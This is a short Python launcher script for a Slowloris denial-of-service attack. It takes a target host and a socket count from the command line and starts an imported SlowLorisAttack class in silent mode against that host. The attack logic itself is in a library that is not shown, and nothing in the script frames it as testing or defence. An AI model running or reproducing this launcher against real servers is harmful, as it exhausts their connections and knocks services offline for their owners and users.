#!/usr/bin/env python3

import rich, sys
from lib import HostAddress, SlowLorisAttack
from logo import logos


url = HostAddress.from_url(f"http://{sys.argv[1]}")
sockets_c = int(sys.argv[2])


dd_attack = SlowLorisAttack(url, sockets_c, silent=True)


dd_attack.start()
